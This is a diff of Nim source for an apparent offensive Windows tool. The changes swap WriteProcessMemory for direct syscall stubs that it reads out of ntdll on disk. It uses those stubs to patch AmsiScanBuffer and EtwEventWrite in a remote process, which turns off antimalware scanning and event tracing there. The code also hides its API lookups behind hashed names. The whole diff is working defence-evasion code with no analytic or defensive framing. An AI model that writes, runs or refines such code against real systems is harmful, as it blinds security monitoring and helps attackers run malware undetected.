@@ -88,34 +88,30 @@ type
   RtlAllocateHeap_t* = proc (HeapHandle: PVOID, Flags: ULONG, Size: SIZE_T): PVOID {.stdcall.}
   GetProcessHeap_t* = proc (): HANDLE {.stdcall.}
   ReadFile_t* = proc (hFile: HANDLE, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, lpNumberOfBytesRead: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.stdcall.}
-  lstrcmpA_t* = proc (lpString1: LPCSTR, lpString2: LPCSTR): int32 {.stdcall.}
-
+  
 const
   CreateFileA_HASH * = obf("CreateFileA")
   GetFileSize_HASH * = obf("GetFileSize")
   RtlAllocateHeap_HASH * = obf("RtlAllocateHeap")
   GetProcessHeap_HASH * = obf("GetProcessHeap")
   ReadFile_HASH * = obf("ReadFile")
-  lstrcmpA_HASH * = obf("lstrcmpA")
-
+  
 var MyCreateFileA*: CreateFileA_t
 var MyGetFileSize*: GetFileSize_t
 var MyRtlAllocateHeap*: RtlAllocateHeap_t
 var MyGetProcessHeap*: GetProcessHeap_t
 var MyReadFile*: ReadFile_t
-var MylstrcmpA*: lstrcmpA_t
 
 MyCreateFileA = cast[CreateFileA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileA_HASH, 0, FALSE)))
 MyGetFileSize = cast[GetFileSize_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetFileSize_HASH, 0, FALSE)))
 MyRtlAllocateHeap = cast[RtlAllocateHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, FALSE)), RtlAllocateHeap_HASH, 0, TRUE)))
 MyGetProcessHeap = cast[GetProcessHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcessHeap_HASH, 0, FALSE)))
 MyReadFile = cast[ReadFile_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), ReadFile_HASH, 0, FALSE)))
-MylstrcmpA = cast[lstrcmpA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), lstrcmpA_HASH, 0, FALSE)))
 
 proc RVAtoRawOffset(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
     return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)
 
-proc GetSyscallStub(functionName: LPCSTR, syscallStub: LPVOID): BOOL =
+proc GetSyscallStub(functionName: cstring, syscallStub: LPVOID): BOOL =
     var
         file: HANDLE
         fileSize: DWORD
@@ -153,9 +149,8 @@ proc GetSyscallStub(functionName: LPCSTR, syscallStub: LPVOID): BOOL =
     for low2 in 0 ..< exportDirectory.NumberOfNames:
         var functionNameVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2], rdataSection))
         var functionVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 1], textSection))
-        var functionNameResolved: LPCSTR = cast[LPCSTR](functionNameVA)
-        var compare: int = MylstrcmpA(functionNameResolved,functionName)
-        if (compare == 0):
+        var functionNameResolved: cstring = cast[cstring](functionNameVA)
+        if (functionNameResolved == functionName):
             copyMem(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
             stubFound = 1
     return stubFound
@@ -521,15 +516,51 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
         echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
 
-    if WriteProcessMemory(hProcss, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
-        echo obf("Failed to write process memory")
+    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
+
+    var oldProtection: DWORD = 0
+    var success: BOOL
+
+    # Define NtProtectVirtualMemory
+    var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+
+    # define NtWriteVirtualMemory
+    let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+
+    var protectAddress = RemoteProc
+
+    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
+    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
+
+    var friendlycodeLength = cast[SIZE_T](patch.len)
+    var t: ULONG
+    var op: ULONG
+    success = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
+    if (success != 0):
+        echo obf("NtProtectVirtualMemory for remote process failed")
+        return disabled
+    echo obf("[*] Applying remote Syscall AMSI patch")
+    var outLength: SIZE_T
+    
+    success = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
+    if (success != 0):
+        echo obf("NtWriteVirtualMemory for remote process failed")
+        return disabled
+    success =  NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,t,addr op)
+    if (success != 0):
+        echo obf("NtProtectVirtualMemory for remote process failed")
         return disabled
     else:
+        echo obf("[*] OldProtect set back")
         disabled = true
+    success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
+
     return disabled
 
 when isMainModule:
-    var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+    var hProcams = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
     success = RemotePatchAmsi(hProcams)
     echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"
 
@@ -556,15 +587,56 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
         echo obf("[X] Failed to get the address of 'EtwEventWrite'")
         return disabled
 
-    if WriteProcessMemory(hProcess, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
-        echo obf("Failed to write process memory")
+    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
+
+    var oldProtection: DWORD = 0
+    var success: BOOL
+
+    # Define NtProtectVirtualMemory
+    var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+
+    # define NtWriteVirtualMemory
+    let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
+    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+
+    var protectAddress = RemoteProc
+
+    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
+    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
+
+    var friendlycodeLength = cast[SIZE_T](patch.len)
+    var t: ULONG
+    var op: ULONG
+    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
+    if (success != 0):
+        echo obf("NtProtectVirtualMemory for remote process failed")
+        return disabled
+    echo obf("[*] Applying remote Syscall ETW patch")
+    var outLength: SIZE_T
+    
+    success = NtWriteVirtualMemory(hProcess,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
+    if (success != 0):
+        echo obf("NtWriteVirtualMemory for remote process failed")
+        return disabled
+    success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
+    if (success != 0):
+        echo obf("NtProtectVirtualMemory for remote process failed")
         return disabled
     else:
         disabled = true
+        echo obf("[*] OldProtect set back")
+    success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
+
+    #if WriteProcessMemory(hProcess, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
+    #    echo obf("Failed to write process memory")
+    #    return disabled
+    #else:
+    #    disabled = true
     return disabled
 
 when isMainModule:
-    var hProcetw = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+    var hProcetw = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
     success = RemotePatchEtw(hProcetw)
     echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"
 
